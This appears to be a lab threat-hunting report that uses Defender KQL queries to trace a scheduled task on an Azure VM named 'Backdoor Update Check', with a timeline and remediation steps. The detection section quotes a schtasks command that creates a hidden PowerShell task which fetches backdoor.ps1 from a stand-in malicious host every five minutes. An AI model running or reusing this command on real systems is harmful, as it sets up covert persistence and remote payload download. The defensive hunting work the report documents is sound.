<img src="https://github.com/user-attachments/assets/a5d72164-2ca6-4836-a5c3-ff2b4e183f46" width="400"/>


# Threat Hunt Report: Suspicious Scheduled Task Creation  
Suspicious Scheduled Task Creation Detected on Workstation: **vm-test-zedd**

## Platforms and Tools Used
- **Microsoft Azure** (Virtual Machine)
- **Microsoft Defender for Endpoint** (EDR telemetry)
- **Kusto Query Language (KQL)** 
- **Windows Task Scheduler** 
- **PowerShell** 

---

## Scenario Overview


The security team suspects that a user has attempted to establish persistence on a lab machine by creating scheduled tasks using schtasks.exe. This is often used by attackers post-exploitation to maintain access or automate execution of payloads.


---

## IoC-Based Threat Hunting Plan

- **Search `DeviceProcessEvents`** for executions of `schtasks.exe` with `create`, `add`, or `/tn` (task name) arguments, which indicate scheduled task creation.
- **Review `DeviceRegistryEvents`** for persistence artifacts under the `TaskCache` registry path:
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`
- **Check `DeviceFileEvents`** for any suspicious script files (e.g., `.ps1`, `.bat`, `.vbs`) dropped near the time of task creation, especially in folders like `Desktop`, `Startup`, or `Temp`.
- **Correlate `DeviceProcessEvents`** with PowerShell or script execution tied to the task trigger to determine if the task ran successfully.


---

## Investigation Steps

### 📁 1. Scheduled Task Creation Detected

On May 26, 2025 at 6:31 PM (UTC-5), user labuser on the device vm-test-zedd executed schtasks.exe to create a scheduled task named "Backdoor Update Check". The task was configured to run every 5 minutes and execute a hidden PowerShell command that downloads a file named backdoor.ps1 to the user's desktop.

**Command Executed:**
```
schtasks.exe /create /tn "Backdoor Update Check" /tr "powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://malicious-site.com/backdoor.ps1 -OutFile C:\Users\labuser\Desktop\backdoor.ps1" /sc minute /mo 5 /f
```

This behavior suggests an attempt to establish persistence and potentially download a malicious payload on a recurring basis.

**KQL Query:**
```kql
DeviceProcessEvents
| where DeviceName == "vm-test-zedd"
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has_all ("create", "/tn")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine
| order by Timestamp desc
```
![1](https://github.com/user-attachments/assets/59fb5b5d-863c-4a52-9217-235fc013508f)



---

### 🧩 2. Registry Artifact Discovered – Scheduled Task Persistence

On **May 26, 2025 at 6:31:01 PM (UTC-5)**, the registry on **vm-test-zedd** recorded the creation of a new scheduled task entry under the **TaskCache** path. The task was associated with the GUID `{3124AC33-AC26-4922-B34F-8FA565F419C6}` and was written by the **SYSTEM** account.

These registry modifications indicate the task was successfully registered for persistence.

**Registry Path Created:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{3124AC33-AC26-4922-B34F-8FA565F419C6}
```

**Actions Observed:**
- `RegistryKeyCreated`
- `RegistryValueSet` (value: `Actions`)

These entries confirm the backdoor task was added to the system’s scheduled task cache.


**KQL Query:**
```kql
DeviceRegistryEvents
| where DeviceName == "vm-test-zedd"
| where RegistryKey startswith "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks"
| project Timestamp, RegistryKey, RegistryValueName, ActionType, InitiatingProcessAccountName
```
![2](https://github.com/user-attachments/assets/499736fa-63e6-478a-8b81-f627966d90f4)



---

### 📄 3. Suspicious Script File Dropped

On **May 26, 2025 at 6:20:43 PM (UTC-5)**, a PowerShell script named **`backdoor.ps1`** was created on the **Desktop** of user **labuser** on the device **vm-test-zedd**. The file creation coincides with the scheduled task configuration observed earlier.

**File Details:**
- **File Name:** `backdoor.ps1`
- **Folder Path:** `C:\Users\labuser\Desktop\backdoor.ps1`
- **Action:** `FileCreated`
- **Initiating User:** `labuser`

This file appears to be the intended payload of the scheduled task, potentially simulating malicious behavior or persistence.


**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName == "vm-test-zedd"
| where FileName endswith ".ps1"
| where FolderPath contains "Desktop"
| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessAccountName
```
![3](https://github.com/user-attachments/assets/159755ea-2955-4d8b-a09d-63d96d064d2f)

---

## 🕒 Chronological Timeline of Events – Suspicious Scheduled Task Activity  
**Device:** `vm-test-zedd`  
**Date:** May 26, 2025 (UTC-5)

| **Time**       | **Event**                        | **Details** |
|----------------|----------------------------------|-------------|
| **6:20:43 PM** | 📄 File Created                  | `backdoor.ps1` created on Desktop by user `labuser`.<br>Path: `C:\Users\labuser\Desktop\backdoor.ps1` |
| **6:31:00 PM** | 📁 Scheduled Task Created        | User `labuser` executed `schtasks.exe` to create a scheduled task named **"Backdoor Update Check"**.<br>Configured to run every 5 minutes via PowerShell. |
| **6:31:01 PM** | 🧩 Registry Key Created          | Task persistence registered in TaskCache under:<br>`{3124AC33-AC26-4922-B34F-8FA565F419C6}` by `SYSTEM`. |
| **6:31:01 PM** | 🧩 Registry Value Set            | Registry value `Actions` added to define task behavior.<br>Confirmed task registration completed. |


---

## 🧾 Summary of Findings

On **May 26, 2025**, user **labuser** on the virtual machine **vm-test-zedd** created and configured a scheduled task intended to persistently download and store a PowerShell script named `backdoor.ps1` to their Desktop.

The investigation revealed the following key findings:

- A suspicious script file (`backdoor.ps1`) was manually or programmatically created on the Desktop prior to task registration.
- The user executed `schtasks.exe` with parameters that silently created a task named **"Backdoor Update Check"**, configured to run every 5 minutes.
- The task action involved running PowerShell in hidden mode to download a remote `.ps1` file from a potentially malicious URI.
- Registry modifications under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks` confirmed the task was successfully registered and persisted at the system level.

These activities suggest an attempt to establish **scheduled, recurring execution of a suspicious script**, potentially simulating **malware persistence behavior**.

No alert was generated by MDE at the time of execution, indicating this threat would have gone undetected without proactive threat hunting.


---

## ✅ Containment and Remediation

The following response actions were taken to mitigate the threat and restore system integrity:

- **Isolated the endpoint (`vm-test-zedd`)** using Microsoft Defender for Endpoint to prevent further communication or potential payload downloads.
  ![isolate-device](https://github.com/user-attachments/assets/46885966-93b4-4687-88d0-fab90bf33025)
- **Deleted the malicious scheduled task** named **"Backdoor Update Check"** using `schtasks /delete` with administrative privileges.
  ![4](https://github.com/user-attachments/assets/c9853ddc-d0e8-4597-9939-6fe55e5e2536)
- **Removed the suspicious script** (`backdoor.ps1`) from the Desktop and verified no other copies or variants were present elsewhere on the system.
- **Flagged the incident for review by the security team** and submitted artifacts (task definition, script hash, and command-line execution trace) to the internal threat team.
